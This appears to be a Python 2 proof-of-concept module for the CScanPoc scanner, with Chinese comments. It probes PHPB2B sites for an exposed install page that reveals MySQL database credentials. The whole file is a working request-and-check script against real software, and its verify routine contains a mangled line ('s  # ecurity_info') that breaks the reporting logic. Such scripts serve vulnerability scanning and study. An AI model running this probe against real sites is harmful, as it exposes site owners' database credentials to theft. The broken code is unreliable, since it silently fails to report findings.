# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import urlparse


class Vuln(ABVuln):
    vuln_id = 'PHPB2B_0001'  # 平台漏洞编号，留空
    name = 'PHPB2B某处漏洞直接查看mysql密码'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INFO_LEAK  # 漏洞类型
    disclosure_date = '2015-02-11'  # 漏洞公布时间
    desc = '''
        PHPB2B 直接访问 install/install.php?step=5&app_lang=zh-cn&do=complete 直接查看mysql密码。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'PHPB2B'  # 漏洞应用名称
    product_version = 'PHPB2B'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'e6868634-fd59-456e-b144-e904a1afb23c'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }
                    
    def verify(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # Refer:http://www.wooyun.org/bugs/wooyun-2015-090306
            hh = hackhttp.hackhttp()
            arg = self.target
            payload = arg + "/install/install.php?step=5&app_lang=zh-cn&do=complete"
            code, head, res, errcode, _ = hh.http(payload)

            if code == 200 and 'name="dbname"' in res and 'name="dbhost"' in res:
                s  # ecurity_info(payload+':Infromation Traversal dbw =value' )
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
